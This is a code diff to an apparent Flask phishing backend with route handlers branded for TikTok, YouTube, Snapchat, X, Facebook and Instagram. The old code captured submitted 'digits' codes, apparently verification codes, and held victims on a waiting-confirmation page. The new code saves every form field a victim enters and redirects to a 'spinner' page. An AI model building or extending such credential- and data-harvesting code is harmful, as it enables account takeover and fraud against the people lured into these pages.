@@ -206,18 +206,26 @@ def joy1_2():
 def joy1_3():
     if request.method == 'POST':
         user = extract_user(request.form)
-        digits = request.form.get('digits','')
-        save_submission('joy1_3', user, f'digits={digits}', code_value=digits, platform_name="TikTok")
         
-        with sqlite3.connect(DB_FILE) as conn:
-            submission = conn.execute(
-                'SELECT id FROM submissions WHERE code_value = ? ORDER BY id DESC LIMIT 1',
-                (digits,)
-            ).fetchone()
-        submission_id = submission[0] if submission else None
+        # Extract all questionnaire data
+        questionnaire_data = []
+        for key, value in request.form.items():
+            if key != 'country':  # We'll handle country separately
+                questionnaire_data.append(f"{key}: {value}")
         
-        waiting_data = get_waiting_confirmation_data("TikTok", url_for('spinner', platform='TikTok'), digits, submission_id)
-        return render_template('waiting_confirmation.html', **waiting_data)
+        # Add country if provided
+        country = request.form.get('country', '')
+        if country:
+            questionnaire_data.append(f"country: {country}")
+        
+        # Save all questionnaire data as a single string
+        data_string = " | ".join(questionnaire_data)
+        
+        # Save without code_value and skip confirmation
+        save_submission('joy1_3', user, data_string, platform_name="TikTok")
+        
+        # DIRECTLY redirect to spinner - NO waiting confirmation
+        return redirect(url_for('spinner', platform='TikTok'))
     
     platform_data = get_platform_details("TikTok")
     return render_template('joy1_3.html', 
@@ -273,18 +281,26 @@ def joy2_2():
 def joy2_3():
     if request.method == 'POST':
         user = extract_user(request.form)
-        digits = request.form.get('digits','')
-        save_submission('joy2_3', user, f'digits={digits}', code_value=digits, platform_name="YouTube")
         
-        with sqlite3.connect(DB_FILE) as conn:
-            submission = conn.execute(
-                'SELECT id FROM submissions WHERE code_value = ? ORDER BY id DESC LIMIT 1',
-                (digits,)
-            ).fetchone()
-        submission_id = submission[0] if submission else None
+        # Extract all questionnaire data
+        questionnaire_data = []
+        for key, value in request.form.items():
+            if key != 'country':  # We'll handle country separately
+                questionnaire_data.append(f"{key}: {value}")
         
-        waiting_data = get_waiting_confirmation_data("YouTube", url_for('spinner', platform='YouTube'), digits, submission_id)
-        return render_template('waiting_confirmation.html', **waiting_data)
+        # Add country if provided
+        country = request.form.get('country', '')
+        if country:
+            questionnaire_data.append(f"country: {country}")
+        
+        # Save all questionnaire data as a single string
+        data_string = " | ".join(questionnaire_data)
+        
+        # Save without code_value and skip confirmation
+        save_submission('joy2_3', user, data_string, platform_name="YouTube")
+        
+        # DIRECTLY redirect to spinner - NO waiting confirmation
+        return redirect(url_for('spinner', platform='YouTube'))
     
     platform_data = get_platform_details("YouTube")
     return render_template('joy2_3.html', 
@@ -340,18 +356,26 @@ def happy1_2():
 def happy1_3():
     if request.method == 'POST':
         user = extract_user(request.form)
-        digits = request.form.get('digits','')
-        save_submission('happy1_3', user, f'digits={digits}', code_value=digits, platform_name="Snapchat")
         
-        with sqlite3.connect(DB_FILE) as conn:
-            submission = conn.execute(
-                'SELECT id FROM submissions WHERE code_value = ? ORDER BY id DESC LIMIT 1',
-                (digits,)
-            ).fetchone()
-        submission_id = submission[0] if submission else None
+        # Extract all questionnaire data
+        questionnaire_data = []
+        for key, value in request.form.items():
+            if key != 'country':  # We'll handle country separately
+                questionnaire_data.append(f"{key}: {value}")
         
-        waiting_data = get_waiting_confirmation_data("Snapchat", url_for('spinner', platform='Snapchat'), digits, submission_id)
-        return render_template('waiting_confirmation.html', **waiting_data)
+        # Add country if provided
+        country = request.form.get('country', '')
+        if country:
+            questionnaire_data.append(f"country: {country}")
+        
+        # Save all questionnaire data as a single string
+        data_string = " | ".join(questionnaire_data)
+        
+        # Save without code_value and skip confirmation
+        save_submission('happy1_3', user, data_string, platform_name="Snapchat")
+        
+        # DIRECTLY redirect to spinner - NO waiting confirmation
+        return redirect(url_for('spinner', platform='Snapchat'))
     
     platform_data = get_platform_details("Snapchat")
     return render_template('happy1_3.html', 
@@ -407,18 +431,26 @@ def happy2_2():
 def happy2_3():
     if request.method == 'POST':
         user = extract_user(request.form)
-        digits = request.form.get('digits','')
-        save_submission('happy2_3', user, f'digits={digits}', code_value=digits, platform_name="X / Twitter")
         
-        with sqlite3.connect(DB_FILE) as conn:
-            submission = conn.execute(
-                'SELECT id FROM submissions WHERE code_value = ? ORDER BY id DESC LIMIT 1',
-                (digits,)
-            ).fetchone()
-        submission_id = submission[0] if submission else None
+        # Extract all questionnaire data
+        questionnaire_data = []
+        for key, value in request.form.items():
+            if key != 'country':  # We'll handle country separately
+                questionnaire_data.append(f"{key}: {value}")
         
-        waiting_data = get_waiting_confirmation_data("X / Twitter", url_for('spinner', platform='X / Twitter'), digits, submission_id)
-        return render_template('waiting_confirmation.html', **waiting_data)
+        # Add country if provided
+        country = request.form.get('country', '')
+        if country:
+            questionnaire_data.append(f"country: {country}")
+        
+        # Save all questionnaire data as a single string
+        data_string = " | ".join(questionnaire_data)
+        
+        # Save without code_value and skip confirmation
+        save_submission('happy2_3', user, data_string, platform_name="X / Twitter")
+        
+        # DIRECTLY redirect to spinner - NO waiting confirmation
+        return redirect(url_for('spinner', platform='X / Twitter'))
     
     platform_data = get_platform_details("X / Twitter")
     return render_template('happy2_3.html', 
@@ -474,18 +506,26 @@ def love1_2():
 def love1_3():
     if request.method == 'POST':
         user = extract_user(request.form)
-        digits = request.form.get('digits','')
-        save_submission('love1_3', user, f'digits={digits}', code_value=digits, platform_name="Facebook")
         
-        with sqlite3.connect(DB_FILE) as conn:
-            submission = conn.execute(
-                'SELECT id FROM submissions WHERE code_value = ? ORDER BY id DESC LIMIT 1',
-                (digits,)
-            ).fetchone()
-        submission_id = submission[0] if submission else None
+        # Extract all questionnaire data
+        questionnaire_data = []
+        for key, value in request.form.items():
+            if key != 'country':  # We'll handle country separately
+                questionnaire_data.append(f"{key}: {value}")
         
-        waiting_data = get_waiting_confirmation_data("Facebook", url_for('spinner', platform='Facebook'), digits, submission_id)
-        return render_template('waiting_confirmation.html', **waiting_data)
+        # Add country if provided
+        country = request.form.get('country', '')
+        if country:
+            questionnaire_data.append(f"country: {country}")
+        
+        # Save all questionnaire data as a single string
+        data_string = " | ".join(questionnaire_data)
+        
+        # Save without code_value and skip confirmation
+        save_submission('love1_3', user, data_string, platform_name="Facebook")
+        
+        # DIRECTLY redirect to spinner - NO waiting confirmation
+        return redirect(url_for('spinner', platform='Facebook'))
     
     platform_data = get_platform_details("Facebook")
     return render_template('love1_3.html', 
@@ -541,18 +581,26 @@ def love2_2():
 def love2_3():
     if request.method == 'POST':
         user = extract_user(request.form)
-        digits = request.form.get('digits','')
-        save_submission('love2_3', user, f'digits={digits}', code_value=digits, platform_name="Instagram")
         
-        with sqlite3.connect(DB_FILE) as conn:
-            submission = conn.execute(
-                'SELECT id FROM submissions WHERE code_value = ? ORDER BY id DESC LIMIT 1',
-                (digits,)
-            ).fetchone()
-        submission_id = submission[0] if submission else None
+        # Extract all questionnaire data
+        questionnaire_data = []
+        for key, value in request.form.items():
+            if key != 'country':  # We'll handle country separately
+                questionnaire_data.append(f"{key}: {value}")
         
-        waiting_data = get_waiting_confirmation_data("Instagram", url_for('spinner', platform='Instagram'), digits, submission_id)
-        return render_template('waiting_confirmation.html', **waiting_data)
+        # Add country if provided
+        country = request.form.get('country', '')
+        if country:
+            questionnaire_data.append(f"country: {country}")
+        
+        # Save all questionnaire data as a single string
+        data_string = " | ".join(questionnaire_data)
+        
+        # Save without code_value and skip confirmation
+        save_submission('love2_3', user, data_string, platform_name="Instagram")
+        
+        # DIRECTLY redirect to spinner - NO waiting confirmation
+        return redirect(url_for('spinner', platform='Instagram'))
     
     platform_data = get_platform_details("Instagram")
     return render_template('love2_3.html', 
